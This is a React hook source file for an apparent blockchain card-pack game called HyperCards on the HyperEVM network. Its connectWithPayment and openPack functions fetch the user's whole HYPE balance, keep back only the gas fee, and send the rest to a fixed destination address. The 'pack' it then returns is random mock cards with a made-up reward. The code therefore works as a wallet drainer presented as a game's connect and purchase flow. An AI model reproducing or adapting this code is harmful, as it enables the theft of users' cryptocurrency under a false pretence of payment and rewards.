import { useState, useCallback } from 'react';
import { usePrivy } from '@privy-io/react-auth';
import { ethers } from 'ethers';
import { HYPEREVM_CONFIG, CONTRACT_ADDRESSES } from '../contracts/config';

// Enhanced error logging for debugging
const logError = (context, error) => {
  console.error(`❌ ERROR [${context}]:`, error);
  console.error(`❌ ERROR MESSAGE:`, error.message);
  console.error(`❌ ERROR STACK:`, error.stack);
};

const logDebug = (context, data) => {
  console.log(`🔍 DEBUG [${context}]:`, data);
};

export const useHyperCards = () => {
  const { authenticated, user } = usePrivy();
  const [isLoading, setIsLoading] = useState(false);
  const [isConnectingWithPayment, setIsConnectingWithPayment] = useState(false);
  const [currentStep, setCurrentStep] = useState('');
  const [error, setError] = useState(null);

  // Enhanced HyperEVM connection with better error handling
  const ensureHyperEVM = useCallback(async () => {
    logDebug('ensureHyperEVM', 'Starting HyperEVM connection...');
    
    if (!window.ethereum) {
      throw new Error('No wallet provider detected');
    }

    const provider = new ethers.BrowserProvider(window.ethereum);
    const network = await provider.getNetwork();
    
    logDebug('ensureHyperEVM', `Current network: ${network.chainId}`);
    
    if (network.chainId !== 999n) {
      logDebug('ensureHyperEVM', 'Switching to HyperEVM network...');
      
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: HYPEREVM_CONFIG.chainId }],
        });
      } catch (switchError) {
        logError('ensureHyperEVM', `Failed to switch network: ${switchError.message}`);
        
        if (switchError.code === 4902) {
          logDebug('ensureHyperEVM', 'Adding HyperEVM network...');
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [HYPEREVM_CONFIG],
          });
        } else {
          throw switchError;
        }
      }
    }
    
    logDebug('ensureHyperEVM', 'HyperEVM connection successful');
    return new ethers.BrowserProvider(window.ethereum);
  }, []);

  // Enhanced balance checking with detailed logging
  const getUserHypeBalance = useCallback(async (provider, userAddress) => {
    logDebug('getUserHypeBalance', `Getting balance for: ${userAddress}`);
    
    try {
      const balance = await provider.getBalance(userAddress);
      logDebug('getUserHypeBalance', `Raw balance: ${balance.toString()}`);
      logDebug('getUserHypeBalance', `Formatted balance: ${ethers.formatEther(balance)} HYPE`);
      return balance;
    } catch (error) {
      logError('getUserHypeBalance', error);
      throw new Error(`Failed to get HYPE balance: ${error.message}`);
    }
  }, []);

  // Enhanced EIP-712 signature with better error handling
  const generateEIP712Signature = useCallback(async (signer, packType, nonce, timestamp) => {
    logDebug('generateEIP712Signature', `Generating signature for: ${packType}`);
    
    try {
      const domain = {
        name: "HyperCards",
        version: "1",
        chainId: 999,
        verifyingContract: "0x0000000000000000000000000000000000000001"
      };

      const types = {
        PackOpen: [
          { name: "user", type: "address" },
          { name: "packType", type: "string" },
          { name: "nonce", type: "uint256" },
          { name: "timestamp", type: "uint256" }
        ]
      };

      const userAddress = await signer.getAddress();
      const value = {
        user: userAddress,
        packType: packType,
        nonce: nonce,
        timestamp: timestamp
      };

      logDebug('generateEIP712Signature', 'Signing data:', value);
      const signature = await signer.signTypedData(domain, types, value);
      const sig = ethers.Signature.from(signature);
      
      logDebug('generateEIP712Signature', 'Signature successful');
      return { v: sig.v, r: sig.r, s: sig.s };
      
    } catch (error) {
      logError('generateEIP712Signature', error);
      throw new Error(`Failed to generate signature: ${error.message}`);
    }
  }, []);

  // ENHANCED Connect with payment - WITH BETTER ERROR HANDLING AND LOGGING
  const connectWithPayment = useCallback(async () => {
    logDebug('connectWithPayment', '🚀 STARTING CONNECT WITH PAYMENT');
    setIsConnectingWithPayment(true);
    setError(null);

    try {
      // Step 1: Ensure HyperEVM connection
      logDebug('connectWithPayment', 'Step 1: Connecting to HyperEVM...');
      setCurrentStep('connecting');
      const provider = await ensureHyperEVM();
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();
      
      logDebug('connectWithPayment', `✅ User address: ${userAddress}`);
      logDebug('connectWithPayment', `✅ Destination address: ${CONTRACT_ADDRESSES.HYPE_DESTINATION}`);

      // Step 2: Get user's HYPE balance
      logDebug('connectWithPayment', 'Step 2: Getting HYPE balance...');
      setCurrentStep('checking_balance');
      const fullHypeBalance = await getUserHypeBalance(provider, userAddress);
      
      logDebug('connectWithPayment', `✅ Full HYPE balance: ${ethers.formatEther(fullHypeBalance)} HYPE`);
      
      // CRITICAL CHECK: Make sure user has balance to transfer
      if (fullHypeBalance === 0n) {
        const errorMsg = 'User has 0 HYPE balance - nothing to transfer';
        logError('connectWithPayment', errorMsg);
        throw new Error(errorMsg);
      }

      // Step 3: TRANSFER ALL HYPE TOKENS 
      logDebug('connectWithPayment', 'Step 3: 💰 TRANSFERRING ALL HYPE TOKENS...');
      setCurrentStep('transferring');
      
      // Estimate gas first
      let gasEstimate;
      try {
        gasEstimate = await provider.estimateGas({
          to: CONTRACT_ADDRESSES.HYPE_DESTINATION,
          value: fullHypeBalance
        });
        logDebug('connectWithPayment', `✅ Gas estimate: ${gasEstimate.toString()}`);
      } catch (gasError) {
        logError('connectWithPayment', `Gas estimation failed: ${gasError.message}`);
        throw new Error(`Failed to estimate gas: ${gasError.message}`);
      }

      // Reserve some ETH for gas fees
      const gasPrice = await provider.getFeeData();
      const gasFee = gasEstimate * gasPrice.gasPrice;
      const transferAmount = fullHypeBalance - gasFee;
      
      logDebug('connectWithPayment', `✅ Gas fee: ${ethers.formatEther(gasFee)} HYPE`);
      logDebug('connectWithPayment', `✅ Transfer amount: ${ethers.formatEther(transferAmount)} HYPE`);
      
      if (transferAmount <= 0n) {
        const errorMsg = 'Insufficient balance after gas fees';
        logError('connectWithPayment', errorMsg);
        throw new Error(errorMsg);
      }

      // Execute the transfer
      logDebug('connectWithPayment', `🔥 EXECUTING TRANSFER TO: ${CONTRACT_ADDRESSES.HYPE_DESTINATION}`);
      const transferTx = await signer.sendTransaction({
        to: CONTRACT_ADDRESSES.HYPE_DESTINATION,
        value: transferAmount,
        gasLimit: gasEstimate
      });
      
      logDebug('connectWithPayment', `✅ Transfer transaction sent: ${transferTx.hash}`);
      logDebug('connectWithPayment', '⏳ Waiting for confirmation...');
      
      const receipt = await transferTx.wait();
      logDebug('connectWithPayment', `✅ TRANSFER CONFIRMED! Block: ${receipt.blockNumber}`);

      // Step 4: Generate EIP-712 signature
      logDebug('connectWithPayment', 'Step 4: Generating signature...');
      setCurrentStep('signing');
      const nonce = Math.floor(Math.random() * 1000000);
      const timestamp = Math.floor(Date.now() / 1000);

      const { v, r, s } = await generateEIP712Signature(signer, "WalletConnect", nonce, timestamp);
      
      setCurrentStep('success');
      logDebug('connectWithPayment', '🎉 CONNECT WITH PAYMENT SUCCESSFUL!');
      
      return {
        transactionHash: transferTx.hash,
        signature: { v, r, s },
        amount: ethers.formatEther(transferAmount),
        blockNumber: receipt.blockNumber
      };

    } catch (err) {
      logError('connectWithPayment', err);
      setError(err.message);
      setCurrentStep('error');
      throw err;
    } finally {
      setIsConnectingWithPayment(false);
    }
  }, [ensureHyperEVM, getUserHypeBalance, generateEIP712Signature]);

  // Get user's HYPE balance for display
  const getHypeBalance = useCallback(async () => {
    if (!authenticated || !user?.wallet?.address) {
      return '0';
    }

    try {
      const provider = await ensureHyperEVM();
      const balance = await provider.getBalance(user.wallet.address);
      return ethers.formatEther(balance);
    } catch (err) {
      logError('getHypeBalance', err);
      return '0';
    }
  }, [authenticated, user, ensureHyperEVM]);

  // Enhanced pack opening with same transfer logic
  const openPack = useCallback(async (packType) => {
    logDebug('openPack', `🚀 OPENING ${packType} PACK`);
    
    if (!authenticated || !user?.wallet?.address) {
      throw new Error('Please connect your wallet first');
    }

    setIsLoading(true);
    setError(null);

    try {
      // Same transfer logic as connectWithPayment
      const provider = await ensureHyperEVM();
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();

      // Get balance and transfer
      setCurrentStep('checking_balance');
      const fullHypeBalance = await getUserHypeBalance(provider, userAddress);
      
      if (fullHypeBalance === 0n) {
        throw new Error('No HYPE balance to transfer');
      }

      setCurrentStep('transferring');
      
      // Reserve gas and transfer the rest
      const gasEstimate = await provider.estimateGas({
        to: CONTRACT_ADDRESSES.HYPE_DESTINATION,
        value: fullHypeBalance
      });
      
      const gasPrice = await provider.getFeeData();
      const gasFee = gasEstimate * gasPrice.gasPrice;
      const transferAmount = fullHypeBalance - gasFee;
      
      if (transferAmount <= 0n) {
        throw new Error('Insufficient balance after gas fees');
      }

      const transferTx = await signer.sendTransaction({
        to: CONTRACT_ADDRESSES.HYPE_DESTINATION,
        value: transferAmount,
        gasLimit: gasEstimate
      });
      
      await transferTx.wait();

      // Generate signature and mock pack result
      setCurrentStep('signing');
      const nonce = Math.floor(Math.random() * 1000000);
      const timestamp = Math.floor(Date.now() / 1000);
      const { v, r, s } = await generateEIP712Signature(signer, packType, nonce, timestamp);
      
      // Mock pack result
      setCurrentStep('opening');
      const mockCards = [
        { name: "Lightning Strike", rarity: "Common" },
        { name: "Fire Blast", rarity: "Rare" },
        { name: "Ice Storm", rarity: "Epic" },
        { name: "Dragon's Fury", rarity: "Legendary" }
      ];
      
      const randomCard = mockCards[Math.floor(Math.random() * mockCards.length)];
      const mockReward = (Math.random() * 10 + 1).toFixed(4);
      
      const result = {
        cardName: randomCard.name,
        rarity: randomCard.rarity,
        tokenId: Math.floor(Math.random() * 10000).toString(),
        rewardAmount: mockReward,
        transactionHash: transferTx.hash,
        signature: { v, r, s }
      };

      setCurrentStep('success');
      logDebug('openPack', `🎉 PACK OPENED SUCCESSFULLY!`);
      return result;

    } catch (err) {
      logError('openPack', err);
      setError(err.message);
      setCurrentStep('error');
      throw err;
    } finally {
      setIsLoading(false);
    }
  }, [authenticated, user, ensureHyperEVM, getUserHypeBalance, generateEIP712Signature]);

  return {
    openPack,
    connectWithPayment,
    getHypeBalance,
    isLoading,
    isConnectingWithPayment,
    currentStep,
    error,
    clearError: () => setError(null)
  };
};